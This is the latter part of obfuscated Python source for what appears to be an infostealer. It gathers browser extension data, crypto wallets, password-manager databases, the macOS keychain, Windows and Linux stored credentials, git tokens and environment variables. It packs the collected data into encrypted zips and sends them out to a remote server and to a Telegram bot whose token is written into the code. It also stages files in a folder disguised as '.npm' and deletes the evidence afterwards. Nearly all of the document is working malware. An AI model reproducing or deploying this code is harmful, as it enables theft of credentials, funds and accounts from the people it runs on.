	else:E+=B.glob(A.path.expanduser('~/.*/*/* Extension Settings/*'));E+=B.glob(A.path.expanduser('~/.config/*/*/* Extension Settings/*'));E+=B.glob(A.path.expanduser('~/.config/*/*/*/* Extension Settings/*'));E+=B.glob(A.path.expanduser('~/.var/**/* Extension Settings/*'));E+=B.glob(A.path.expanduser('~/snap/**/* Extension Settings/*'));E+=B.glob('/mnt/*/Users/*/AppData/*/*/*/* Extension Settings/*');E+=B.glob('/mnt/*/Users/*/AppData/*/*/*/*/* Extension Settings/*');E+=B.glob('/mnt/*/Users/*/AppData/*/*/*/*/*/* Extension Settings/*');E+=B.glob('/mnt/*/Users/*/AppData/*/*/*/*/User Data*/*/* Extension Settings/*');E+=B.glob(A.path.expanduser('~/.*/*/IndexedDB/chrome-extension_'));E+=B.glob(A.path.expanduser('~/.config/*/*/IndexedDB/chrome-extension_'));E+=B.glob(A.path.expanduser('~/.config/*/*/*/IndexedDB/chrome-extension_'));E+=B.glob(A.path.expanduser('~/.var/**/IndexedDB/chrome-extension_'));E+=B.glob(A.path.expanduser('~/snap/**/IndexedDB/chrome-extension_'));E+=B.glob('/mnt/*/Users/*/AppData/*/*/*/IndexedDB/chrome-extension_');E+=B.glob('/mnt/*/Users/*/AppData/*/*/*/*/IndexedDB/chrome-extension_');E+=B.glob('/mnt/*/Users/*/AppData/*/*/*/*/*/IndexedDB/chrome-extension_');E+=B.glob('/mnt/*/Users/*/AppData/*/*/*/*/User Data*/*/IndexedDB/chrome-extension_')
	U=[]
	for H in E:
		if AT in H or AU in H:continue
		try:
			K=H.split(A.sep)
			if K[-2]==Y:N=A.path.basename(H).split('_')[1]
			else:N=A.path.basename(H)
			if K[-2]==j and N in a or K[-2]==k and N in b or K[-2]==Y and N in c:
				P=L(AE(H).parent.parent);d=h(P);U.append(f"{H} #{d}");J=K[-5]if Bj in P else K[-4]
				if J==Bk:J=An
				elif J==Bl:J=Am
				elif J==B7 or J==Bm:J=B8
				else:J=J.replace('-','_')
				M=K[-3]
				if M==AN:M=0
				elif M.startswith(AO):M=M[8:]
				elif M.endswith(AP):M=M[:-8]
				Q=I
				if K[-2]==j:Q=a[N]
				elif K[-2]==k:Q=b[N]
				elif K[-2]==Y:Q=f"{c[N]}.idb"
				W=f"{J}-{M}-{h(P)}-{N}-{Q}"
				if H.startswith('/mnt/'):W='mnt$'+W
				e=A.path.join(T,W);A.makedirs(e,exist_ok=D);w(H,e)
				if N==g:
					X=A.path.join(P,'Local Storage')
					if A.path.isdir(X):
						try:A.makedirs(Z,exist_ok=D);w(X,A.path.join(Z,f"{J}-{M}-{d}"))
						except G as S:C(f"Error to copy {X}: "+L(S))
		except G as S:U.append(f"{H}: {S}");C(f"Error {H}: "+L(S))
	if A.path.isdir(T):
		with R(A.path.join(T,'_chromium_exts.txt'),V)as l:l.write(u.join(U))
def C0(target_path):
	G=target_path;C=[]
	if F.platform==O or F.platform==AS:C+=B.glob(A.path.expandvars('%LOCALAPPDATA%\\*\\Profiles\\*\\prefs.js'));C+=B.glob(A.path.expandvars('%LOCALAPPDATA%\\*\\*\\Profiles\\*\\prefs.js'));C+=B.glob(A.path.expandvars('%LOCALAPPDATA%\\*\\*\\*\\Profiles\\*\\prefs.js'));C+=B.glob(A.path.expandvars('%APPDATA%\\*\\Profiles\\*\\prefs.js'));C+=B.glob(A.path.expandvars('%APPDATA%\\*\\*\\Profiles\\*\\prefs.js'));C+=B.glob(A.path.expandvars('%APPDATA%\\*\\*\\*\\Profiles\\*\\prefs.js'))
	elif F.platform==m:C+=B.glob(A.path.expanduser('~/Library/Application Support/*/Profiles/*/prefs.js'));C+=B.glob(A.path.expanduser('~/Library/Application Support/*/*/Profiles/*/prefs.js'));C+=B.glob(A.path.expanduser('~/Library/Application Support/*/*/*/Profiles/*/prefs.js'))
	else:C+=B.glob(A.path.expanduser('~/.*/*/Profiles/*/prefs.js'));C+=B.glob(A.path.expanduser('~/.config/*/*/Profiles/*/prefs.js'));C+=B.glob(A.path.expanduser('~/.config/*/*/*/Profiles/*/prefs.js'));C+=B.glob(A.path.expanduser('~/.var/**/Profiles/*/prefs.js'));C+=B.glob(A.path.expanduser('~/snap/**/Profiles/*/prefs.js'))
	if M(C)==0:return
	I=[]
	for D in C:
		if AT in D or AU in D:continue
		E=A.path.dirname(D);J=B.glob(A.path.join(E,'storage','default','moz-extension+++*'))
		if J:
			K=h(E);I.append(f"{E} #{K}");L=E.split(A.sep);P=L[-1].split('.')[0];Q=f"{L[-3]}-{P}-{K}";H=A.path.join(G,Q);A.makedirs(H);Z(D,A.path.join(H,A.path.basename(D)))
			for N in J:w(N,A.path.join(H,A.path.basename(N)))
	if A.path.isdir(G):
		with R(A.path.join(G,'_firefox_profiles.txt'),V)as S:S.write(u.join(I))
def C1(target_path):
	l='.config/gh/hosts.yml';k='.config/git/credentials';j='~/Monero/wallets';i='~/.bitmonero/wallets';g='~/.config/solana/id.json';f='.config\\gh\\hosts.yml';e='.config\\git\\credentials';b='Dogecoin/wallets.dat';a='Bitcoin/wallets';Y='Electrum/wallets';X='atomic/Local Storage';W='Exodus/exodus.wallet';V='Monero/wallets';U='bitmonero/wallets';T='app';S='solana_id.json';R='Proxifier4';Q='WinAuth';P='Electrum';N='.git-credentials';M=target_path
	if F.platform==O:
		J={'.bitmonero\\wallets':'bitmonero\\wallets','Documents\\Monero\\wallets':'Monero\\wallets','AppData\\Local\\1Password\\1password.sqlite':'1Password\\1password.sqlite','AppData\\Local\\1Password\\1password.sqlite-shm':'1Password\\1password.sqlite-shm','AppData\\Local\\1Password\\1password.sqlite-wal':'1Password\\1password.sqlite-wal','AppData\\Local\\1Password\\1password_resources.sqlite':'1Password\\1password_resources.sqlite','AppData\\Roaming\\Exodus\\exodus.wallet':'Exodus\\exodus.wallet','AppData\\Roaming\\atomic\\Local Storage':'atomic\\Local Storage','AppData\\Roaming\\Electrum\\wallets':'Electrum\\wallets','AppData\\Roaming\\Electrum\\config':P,'AppData\\Roaming\\Bitcoin\\wallets':'Bitcoin\\wallets','AppData\\Roaming\\Dogecoin\\wallets.dat':'Dogecoin\\wallets.dat','AppData\\Roaming\\WinAuth':Q,'AppData\\Roaming\\Proxifier4\\Profiles':R,'AppData\\Roaming\\Dashlane':AV,'AppData\\Roaming\\Bitwarden':AX,'AppData\\Roaming\\NordPass':AW,N:N,'.config\\solana\\id.json':S,e:e,f:f}
		for I in J:
			try:
				E=A.path.join(A.path.expandvars(Bn),I);H=A.path.join(M,T,J[I])
				if A.path.isdir(E):A.makedirs(H,exist_ok=D);w(E,H)
				elif A.path.isfile(E):A.makedirs(A.path.dirname(H),exist_ok=D);Z(E,H)
			except G as K:C(f"Error {I}: "+L(K))
	elif F.platform==m:
		try:Z(A.path.expanduser('~/Library/Keychains/login.keychain-db'),A.path.join(M,'login.keychain-db'))
		except G as K:C(f"failed to copy keychain: "+L(K));Ax(f"failed to copy keychain: "+L(K))
		J={g:S,i:U,j:V,'~/Library/Application Support/1Password':B9,'~/Library/Application Support/Exodus/exodus.wallet':W,'~/Library/Application Support/atomic/Local Storage':X,'~/Library/Application Support/Electrum/wallets':Y,'~/Library/Application Support/Electrum/config':P,'~/Library/Application Support/Bitcoin/wallets':a,'~/Library/Application Support/Dogecoin/wallets.dat':b,'~/Library/Application Support/WinAuth':Q,'~/Library/Application Support/Proxifier4/Profiles':R,'~/Library/Application Support/Dashlane':AV,'~/Library/Application Support/Bitwarden':AX,'~/Library/Application Support/NordPass':AW}
		for I in J:
			try:
				E=A.path.expanduser(I);H=A.path.join(M,T,J[I])
				if A.path.isdir(E):A.makedirs(H,exist_ok=D);w(E,H)
				elif A.path.isfile(E):A.makedirs(A.path.dirname(H),exist_ok=D);Z(E,H)
			except G as K:C(f"Error {I}: "+L(K))
	else:
		J={g:S,'~/.config/1Password':B9,'~/.config/Exodus/exodus.wallet':W,'~/.config/atomic/Local Storage':X,'~/.config/Bitcoin/wallets':a,'~/.config/Dogecoin/wallets.dat':b,'~/.config/Electrum/wallets':Y,'~/.config/Electrum/config':P,'~/.config/WinAuth':Q,'~/.config/Proxifier4/Profiles':R,'~/.config/Dashlane':AV,'~/.config/Bitwarden':AX,'~/.config/NordPass':AW,'~/.git-credentials':N,'~/.config/git/credentials':k,'~/.config/gh/hosts.yml':l,i:U,j:V}
		for I in J:
			try:
				E=A.path.expanduser(I);H=A.path.join(M,T,J[I])
				if A.path.isdir(E):A.makedirs(H,exist_ok=D);w(E,H)
				elif A.path.isfile(E):A.makedirs(A.path.dirname(H),exist_ok=D);Z(E,H)
			except G as K:C(f"Error {I}: "+L(K))
		c={'/mnt/*/Users/*/.bitmonero/wallets':U,'/mnt/*/Users/*/Documents/Monero/wallets':V,'/mnt/*/Users/*/AppData/Local/1Password/1password.sqlite':'1Password/1password.sqlite','/mnt/*/Users/*/AppData/Local/1Password/1password.sqlite-shm':'1Password/1password.sqlite-shm','/mnt/*/Users/*/AppData/Local/1Password/1password.sqlite-wal':'1Password/1password.sqlite-wal','/mnt/*/Users/*/AppData/Local/1Password/1password_resources.sqlite':'1password_resources/1password.sqlite','/mnt/*/Users/*/AppData/Roaming/Exodus/exodus.wallet':W,'/mnt/*/Users/*/AppData/Roaming/atomic/Local Storage':X,'/mnt/*/Users/*/AppData/Roaming/Electrum/wallets':Y,'/mnt/*/Users/*/AppData/Roaming/Electrum/config':P,'/mnt/*/Users/*/AppData/Roaming/Bitcoin/wallets':a,'/mnt/*/Users/*/AppData/Roaming/Dogecoin/wallets.dat':b,'/mnt/*/Users/*/AppData/Roaming/WinAuth':Q,'/mnt/*/Users/*/AppData/Roaming/Proxifier4/Profiles':R,'/mnt/*/Users/*/AppData/Roaming/Dashlane':AV,'/mnt/*/Users/*/AppData/Roaming/Bitwarden':AX,'/mnt/*/Users/*/AppData/Roaming/NordPass':AW,'/mnt/*/Users/*/.git-credentials':N,'/mnt/*/Users/*/.config/solana/id.json':S,'/mnt/*/Users/*/.config/git/credentials':k,'/mnt/*/Users/*/.config/gh/hosts.yml':l}
		for d in c:
			J=B.glob(d)
			for I in J:
				try:
					H=A.path.join(M,'mnt_app',f"{h(E)}-{c[d]}")
					if A.path.isdir(E):A.makedirs(H,exist_ok=D);w(E,H)
					elif A.path.isfile(E):A.makedirs(A.path.dirname(H),exist_ok=D);Z(E,H)
				except G as K:C(f"Error {I}: "+L(K))
def C2():
	R='replace';Q='Flags'
	if F.platform==O:
		class T(J.Structure):'\n            Defines the layout for the WINAPI FILETIME struct.\n            https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-filetime\n            ';_fields_=[('dwLowDateTime',J.c_int),('dwHighDateTime',J.c_int)]
		class U(J.Structure):'\n            Defines the layout for the WINAPI CREDENTIAL_ATTRIBUTEW struct.\n            See https://docs.microsoft.com/en-us/windows/win32/api/wincred/ns-wincred-credential_attributew.\n            ';_fields_=[('Keyword',P.LPWSTR),(Q,P.DWORD),('ValueSize',P.DWORD),('Value',P.LPBYTE)]
		class C(J.Structure):'\n            Defines the layout for the WINAPI CREDENTIALW struct.\n            https://docs.microsoft.com/en-us/windows/win32/api/wincred/ns-wincred-credentialw\n            ';_fields_=[(Q,P.DWORD),('Type',P.DWORD),('TargetName',P.LPWSTR),('Comment',P.LPWSTR),('LastWritten',T),('CredentialBlobSize',P.DWORD),('CredentialBlob',J.POINTER(J.c_char)),('Persist',P.DWORD),('AttributeCount',P.DWORD),('Attributes',J.POINTER(U)),('TargetAlias',P.LPWSTR),('UserName',P.LPWSTR)]
		A=J.windll.advapi32;A.CredReadW.restype=P.BOOL;A.CredReadW.argtypes=[P.LPCWSTR,P.DWORD,P.DWORD,J.POINTER(J.POINTER(C))];A.CredEnumerateW.restype=P.BOOL;A.CredEnumerateW.argtypes=[P.LPCWSTR,P.DWORD,J.POINTER(P.DWORD),J.POINTER(J.POINTER(J.POINTER(C)))];H=J.windll.kernel32;H.GetLastError.restype=P.DWORD;I=P.DWORD();D=J.POINTER(J.POINTER(C))();V=A.CredEnumerateW(E,1,J.byref(I),J.byref(D))
		if not V:W=H.GetLastError();raise S(W)
		K=[]
		for X in range(I.value):B=D[X].contents;K.append({'Domain':B.TargetName,'Username':B.UserName,'Password':B.CredentialBlob[:B.CredentialBlobSize.real].replace(b'\x00',z).decode(errors=R)})
		A.CredFree(D);return K
	elif F.platform.startswith(AB)or B6 in F.platform.lower():
		a(BX);a(Al);import secretstorage as L;Y=L.dbus_init();Z=L.get_default_collection(Y);M=[]
		for G in Z.get_all_items():
			N={}
			for(b,c)in G.get_attributes().items():N[b]=c
			M.append({'schema':G.get_label(),'attributes':N,'secret':G.get_secret().decode(errors=R)})
		return M
	else:return
def BL(folder_path,output_file,password=I,compression=A3.ZIP_STORED):
	C=folder_path;F=A.path.basename(C);H=A.walk(C)
	try:
		D=A3.AESZipFile(output_file,V,compression=compression,encryption=A3.WZ_AES);D.pwd=password.encode()
		for(G,J,K)in H:
			for L in J:B=A.path.join(G,L);E=B.replace(C+A.path.sep,I);D.write(B,A.path.join(F,E))
			for M in K:B=A.path.join(G,M);E=B.replace(C+A.path.sep,I);D.write(B,A.path.join(F,E))
	finally:
		try:D.close()
		except:pass
def Ax(text):
	if o:A=f"{A0}/verify-human/00"
	else:A=f"{A0}/verify-human/{p}"
	try:
		B={'text':f"[{p}] {As}${A1} / {BE}\n{text}"};E=A2.post(A,data=B)
		if E.status_code==200:return D
	except G as F:C(f"Failed to report telegram: {F}")
	return H
def U(text):A=Bt.Thread(target=Ax,args=(text,));A.start()
def Ay(filename):
	B=filename;C(f"telegram-uploading: {B}");E=A.path.getsize(B)/1048576
	if E>50:C(f"Error: file size overflow. Max size is 50 MB. Size: {E:.2f} MB");return H
	F='7870147428:AAGbYG_eYkiAziCKRmkiQF-GnsGTic_3TTU';G=f"https://api.telegram.org/bot{F}/sendDocument"
	with R(B,Ak)as I:
		J={'document':I};K={'chat_id':Ar};D=A2.post(G,data=K,files=J)
		if D.status_code==200:C('telegram upload succeed')
		else:C(f"Failed to upload file. Status code: {D.status_code}, Response: {D.text}")
def BM(client_id,path,file_paths,sid=E):
	E=file_paths;D=client_id;C(f"http-uploading {M(E)} files: {D} / {path}");H={Bo:D,i:path,y:sid};F=[(A.path.basename(B),R(B,Ak))for B in E];I=f"{A0}/u/f";J=A2.utils.default_headers()
	with A2.post(I,data=H,files=F,headers=J)as B:
		if B.status_code==200:C(f"http upload succeed: {M(F)} files")
		else:C(f"Failed to upload file. Status code: {B.status_code}, Response: {B.text}");raise G(f"Failed to upload file. Status code: {B.status_code}")
def C3():
	j='/mnt';i='~/pCloud/Cache';h='~/Downloads/MEGA Downloads';g='~/Documents/MEGA';f='~/MEGAsync';e='~/Box';d='~/iCloud Drive';c='~/SkyDrive';b='~/OneDrive';a='~/My Drive*';Z='~/Dropbox*';W='*';V='pCloud';U='Box';T='iCloud';S='SkyDrive';R='OneDrive';Q='GoogleDrive';P='Dropbox';K='Mega';C();H=['[All Done]']
	if F.platform==O:
		import string as k;l=k.ascii_uppercase;X=[]
		for Y in l:
			n=f"{Y}:\\"
			if A.path.exists(n):X.append(f"{Y}:")
		H.append(C(f"Available drives: {X}"));I={'%UserProfile%\\Dropbox*':P,'%UserProfile%\\My Drive*':Q,'%UserProfile%\\OneDrive':R,'%UserProfile%\\SkyDrive':S,'%UserProfile%\\iCloud Drive':T,'%UserProfile%\\Box':U,'%UserProfile%\\MEGAsync':K,'%UserProfile%\\Documents\\MEGA':K,'%UserProfile%\\Downloads\\MEGA Downloads':K,'%LocalAppData%\\pCloud\\Cache':V}
		for D in I:
			try:
				E=A.path.expandvars(D)
				if W in E:
					for J in B.glob(E):
						if A.path.isdir(J)and A.listdir(J):H.append(C(f"{I[D]}: {J}"))
				elif A.path.isdir(E)and A.listdir(E):H.append(C(f"{I[D]}: {E}"))
			except G as M:H.append(C(f"Error {D}: "+L(M)))
	elif F.platform==m:
		N=A.path.expanduser('~/Library/CloudStorage')
		if A.path.isdir(N)and A.listdir(N):
			for D in A.listdir(N):H.append(C(A.path.join(N,D)))
		else:H.append(C('No CloudStorage'))
		I={Z:P,a:Q,b:R,c:S,d:T,e:U,f:K,g:K,h:K,i:V}
		for D in I:
			try:
				E=A.path.expanduser(D)
				if W in E:
					for J in B.glob(E):
						if A.path.isdir(J)and A.listdir(J):H.append(C(f"{I[D]}: {J}"))
				elif A.path.isdir(E)and A.listdir(E):H.append(C(f"{I[D]}: {E}"))
			except G as M:H.append(C(f"Error {D}: "+L(M)))
	else:
		I={Z:P,a:Q,b:R,c:S,d:T,e:U,f:K,g:K,h:K,i:V}
		for D in I:
			try:
				E=A.path.expanduser(D)
				if W in E:
					for J in B.glob(E):
						if A.path.isdir(J)and A.listdir(J):H.append(C(f"{I[D]}: {J}"))
				elif A.path.isdir(E)and A.listdir(E):H.append(C(f"{I[D]}: {E}"))
			except G as M:H.append(C(f"Error {D}: "+L(M)))
		for D in A.listdir(j):H.append(C(A.path.join(j,D)))
	return u.join(H)
if __name__=='__main__':
	if(Ap or f)and M(K)<=1:K.append('-a')
	if M(K)<=1:C('Error')
	elif K[1]=='-u':
		try:Az=Ay(K[2])
		except G as N:C(f"tg-upload failed: {N}")
	elif Ap or f or any(A in K for A in['-fc','-f','-a']):
		try:
			q=f"{As}${A1}";q=I.join([A if ord(A)<128 else I for A in q]);q=re.sub('[<>:"/\\\\|?*]','_',q)
			if g is not E:
				A_={Bo:q,y:Q};C4=f"{A0}/u/e";C5=A2.utils.default_headers()
				with A2.post(C4,data=A_,headers=C5)as B0:
					if B0.status_code==429:Ax(C(f"Status code: {B0.status_code}, Response: {B0.text}"));AK('</?>');exit()
			if'-fc'in K:Ad=D;A5=D;r=D;B1='_fc'
			elif'-f'in K:Ad=F.platform!=O;A5=H;r=D;B1='_f'
			else:Ad=F.platform!=O;A5=H;r=H;B1=I
			C6=f or'-fmac'in K
			if f:s=I
			elif F.platform==O:s=A.path.join(A.path.expandvars(Bn),'.npm')
			else:s='/tmp/.npm'
			C7=n.datetime.now(n.timezone.utc).strftime('%y%m%d_%H%M%S');A6=f"{q}{B1}_{C7}";X=A.path.join(s,A6);A7=A.path.join(s,A6+'_2');U(C(f"running on {A.getcwd()}"));A.makedirs(X,exist_ok=D)
			with R(A.path.join(X,'_info.json'),V)as b:A_={'channel':p,'pc_name':As,'pc_login':A1,'pc_info':BE,i:A.getcwd(),'uuid':BH,y:Q,'python':At,'timestamp':t(AZ.time()),'client_utc':n.datetime.now(n.timezone.utc).strftime(B5)};e.dump(A_,b,indent=4)
			l=A.path.join(X,'login');A.makedirs(l,exist_ok=D)
			try:
				BN=dict(A.environ)
				with R(A.path.join(l,'_sysenv.json'),V)as b:e.dump(BN,b,indent=4)
				with R(A.path.join(l,'_sysenv.env'),V)as b:
					for(C8,C9)in BN.items():CA=C9.replace(u,'\\n');b.write(f"{C8}={CA}\n")
			except G as Y:
				with R(A.path.join(l,'_sysenv.txt'),V)as b:b.write(W.format_exc())
			try:
				BO=C2()
				if BO:
					with R(A.path.join(l,'_credentials.json'),V)as b:e.dump(BO,b,indent=4)
			except G as Y:
				with R(A.path.join(l,'_credentials.txt'),V)as b:b.write(W.format_exc())
			if F.platform==m:
				if C6:Aw(A.path.join(X,BA),A.path.join(X,BB),D,H,r);BK(l,D,A5,r)
				else:Aw(A.path.join(X,BA),A.path.join(X,BB),D,A5,r)
			else:Aw(A.path.join(X,BA),A.path.join(X,BB),Ad,H,r);BK(l,Ad,A5,r)
			Bz(l,D,A5,r);B_(A.path.join(X,'ext'),A.path.join(A7,'local_storage'));C0(A.path.join(X,'firefox'));C1(X);x=A.path.join(s,f"{A6}.tmp")
			try:import lzma;Ae=A3.ZIP_LZMA;U(C(f"packing (LZMA): {x}"))
			except:
				try:import bz2;Ae=A3.ZIP_BZIP2;U(C(f"packing (BZIP2): {x}"))
				except:Ae=A3.ZIP_DEFLATED;U(C(f"packing (DEFLATED): {x}"))
			BL(X,x,Bp,Ae)
			if not Bq in K:
				try:v.rmtree(X);C(f"deleted target_dir: {X}")
				except G as N:C(f"Failed to delete target_dir: {X}: {N}")
			CB=BJ(x);c=A.path.join(s,f"{A6}#{CB}.zip")
			try:A.rename(x,c)
			except G as N:C(f"Failed to rename: {c}: {N}");c=x
			AH=A.path.getsize(c)/1048576;B2=H;Az=H
			if'-hh'in K or not Ao in K:
				U(C(f"http-uploading ({AH:.2f} MB): {c}"))
				try:BM(f"{q}",f"_auto",[c],Q);B2=D;U(C(f"http-upload succeed: {A.path.basename(c)} ({AH:.2f} MB)"))
				except G as N:U(C(f"http-upload failed: {N}"))
			if(Ao in K or not B2)and AH<50:
				U(C(f"tg-uploading ({AH:.2f} MB): {c}"))
				try:Ay(c);Az=D;U(C(f"tg-upload succeed: {A.path.basename(c)} ({AH:.2f} MB)"))
				except G as N:U(C(f"tg-upload failed: {N}"))
			if B2 or Az:
				try:A.remove(c);C(f"deleted: {c}")
				except G as N:C(f"Failed to delete: {c}: {N}")
			if A.path.isdir(A7):
				AI=A.path.join(s,f"{A6}_2.tmp");U(C(f"packing: {AI}"));BL(A7,AI,Bp,Ae)
				if not Bq in K:
					try:v.rmtree(A7);C(f"deleted target_dir_2: {A7}")
					except G as N:C(f"Failed to delete target_dir_2: {A7}: {N}")
				CC=BJ(AI);d=A.path.join(s,f"{A6}_2#{CC}.zip")
				try:A.rename(AI,d)
				except G as N:C(f"Failed to rename: {d}: {N}");d=AI
				AJ=A.path.getsize(d)/1048576;B3=H;BP=H
				if'-hh'in K or not Ao in K:
					U(C(f"http-uploading ({AJ:.2f} MB): {d}"))
					try:BM(f"{q}",f"_auto",[d]);B3=D;U(C(f"http-upload succeed: {A.path.basename(d)} ({AJ:.2f} MB)"))
					except G as N:U(C(f"http-upload failed: {N}"))
				if(Ao in K or not B3)and AJ<50:
					U(C(f"tg-uploading ({AJ:.2f} MB): {d}"))
					try:Ay(d);BP=D;U(C(f"tg-upload succeed: {A.path.basename(d)} ({AJ:.2f} MB)"))
					except G as N:U(C(f"tg-upload failed: {N}"))
				if B3 or BP:
					try:A.remove(d);C(f"deleted: {d}")
					except G as N:C(f"Failed to delete: {d}: {N}")
			else:C(f"No dir_2")
			U(C3());C('[END]')
			if g is not E and g!=I:
				if F.platform==O:BQ=A.path.expandvars(f"%LOCALAPPDATA%\\Temp\\{g}")
				else:BQ=f"/tmp/{g}"
				with R(BQ,V)as b:b.write(g)
		except G as N:C(f"Error: {N}");C(W.format_exc(),D);U(f"Error: {N}")
	else:C('Error')
